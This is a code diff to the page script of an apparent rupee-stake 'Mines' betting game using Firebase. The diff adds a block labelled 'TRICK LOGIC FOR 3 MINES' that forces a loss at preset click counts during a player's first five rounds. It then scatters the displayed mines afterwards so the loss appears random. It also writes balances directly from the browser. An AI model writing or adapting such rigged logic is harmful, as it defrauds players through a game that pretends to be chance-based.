@@ -154,6 +154,7 @@
     </style>
 </head>
 <body>
+
 <div class="game-container">
     <div class="top-nav">
         <div style="display: flex; align-items: center;">
@@ -202,6 +203,7 @@
         <span>VERIFY</span>
     </div>
 </div>
+
 <script>
     const firebaseConfig = {
         apiKey: "AIzaSyAFeBWLykjlE25vzKFRRJjAw6f1gylplLI",
@@ -210,6 +212,7 @@
         projectId: "admin222-a87bb",
         appId: "1:125393999260:web:cb36cbaa8bfac5cf0be459"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const userPhone = localStorage.getItem('user_phone');
@@ -220,6 +223,7 @@
     let minePositions = [];
     let revealedCount = 0;
     let currentWinAmount = 0;
+    let totalRoundsPlayed = 0;
 
     if (!userPhone) window.location.href = "index.html";
 
@@ -229,9 +233,6 @@
             currentBalance = parseFloat(userData.balance || 0);
             document.getElementById('userBalance').innerText = currentBalance.toFixed(2);
             if(userData.uid) document.getElementById('userUid').innerText = userData.uid;
-            if (currentBalance >= 200 && !gameActive) {
-                window.location.href = "lobby.html";
-            }
         }
     });
 
@@ -286,35 +287,44 @@
         gameActive = true;
         revealedCount = 0;
         currentWinAmount = 0;
+        totalRoundsPlayed++;
+
         const btn = document.getElementById('mainBetBtn');
         btn.innerHTML = `<span>CASH OUT</span><span class="btn-sub-text">₹0.00</span>`;
         btn.classList.add('cashout');
         document.getElementById('totalWin').innerText = "0.00 INR";
         
         minePositions = [];
-        
-        // --- 70% PROBABILITY LOGIC ---
-        let isLucky = Math.random() < 0.70;
-        let safeZones = [];
-        if(isLucky) {
-            while(safeZones.length < 5) {
-                let s = Math.floor(Math.random() * 25);
-                if(!safeZones.includes(s)) safeZones.push(s);
-            }
-        }
-
-        while(minePositions.length < selectedMines) {
-            let r = Math.floor(Math.random() * 25);
-            if(isLucky && safeZones.includes(r)) continue;
-            if(!minePositions.includes(r)) minePositions.push(r);
-        }
-        
         generateGrid();
     }
 
     function revealBox(index, element) {
         if(!gameActive || element.classList.contains('disabled')) return;
-        if(minePositions.includes(index)) {
+
+        let shouldMine = false;
+
+        // --- TRICK LOGIC FOR 3 MINES ---
+        if (selectedMines === 3) {
+            if (totalRoundsPlayed === 1) {
+                if (revealedCount === 5) shouldMine = true;
+            } 
+            else if (totalRoundsPlayed === 2) {
+                if (revealedCount === 3) shouldMine = true;
+            } 
+            else if (totalRoundsPlayed >= 3 && totalRoundsPlayed <= 5) {
+                if (revealedCount === 6) shouldMine = true;
+            } 
+            else {
+                if (minePositions.length === 0) setupRandomMines(index);
+                if (minePositions.includes(index)) shouldMine = true;
+            }
+        } else {
+            if (minePositions.length === 0) setupRandomMines(index);
+            if (minePositions.includes(index)) shouldMine = true;
+        }
+
+        if(shouldMine) {
+            if(!minePositions.includes(index)) minePositions.push(index); 
             element.classList.add('revealed-mine');
             element.innerHTML = '💣';
             gameOver(false);
@@ -327,6 +337,15 @@
         }
     }
 
+    function setupRandomMines(firstClick) {
+        while(minePositions.length < selectedMines) {
+            let r = Math.floor(Math.random() * 25);
+            if(r !== firstClick && !minePositions.includes(r)) {
+                minePositions.push(r);
+            }
+        }
+    }
+
     function updateWinDisplay() {
         const bet = parseInt(document.getElementById('betAmount').value);
         let multiplier = 1;
@@ -336,18 +355,11 @@
         currentWinAmount = parseFloat((bet * multiplier * 0.98).toFixed(2));
         document.getElementById('totalWin').innerText = currentWinAmount.toFixed(2) + " INR";
         document.getElementById('mainBetBtn').innerHTML = `<span>CASH OUT</span><span class="btn-sub-text">₹${currentWinAmount.toFixed(2)}</span>`;
-        if ((currentBalance + currentWinAmount) >= 200) {
-            cashOut(true);
-        }
     }
 
-    function cashOut(isAuto = false) {
+    function cashOut() {
         if(!gameActive || revealedCount === 0) return;
-        db.ref('users/' + userPhone).update({ balance: currentBalance + currentWinAmount }).then(() => {
-            if (isAuto || (currentBalance + currentWinAmount) >= 200) {
-                window.location.href = "lobby.html";
-            }
-        });
+        db.ref('users/' + userPhone).update({ balance: currentBalance + currentWinAmount });
         const popup = document.getElementById('winPopup');
         popup.innerText = "+₹" + currentWinAmount.toFixed(2);
         popup.style.display = 'block';
@@ -360,6 +372,14 @@
         const btn = document.getElementById('mainBetBtn');
         btn.innerHTML = `<span>PLACE BET</span>`;
         btn.classList.remove('cashout');
+        
+        if (minePositions.length < selectedMines) {
+            while(minePositions.length < selectedMines) {
+                let r = Math.floor(Math.random() * 25);
+                if(!minePositions.includes(r)) minePositions.push(r);
+            }
+        }
+
         const items = document.querySelectorAll('.grid-item');
         minePositions.forEach((pos) => {
             items[pos].innerHTML = '💣';
@@ -373,7 +393,8 @@
         document.getElementById('totalWin').innerText = "0.00 INR";
         generateGrid();
     }
+
     generateGrid();
 </script>
 </body>
-</html>
+        </html>
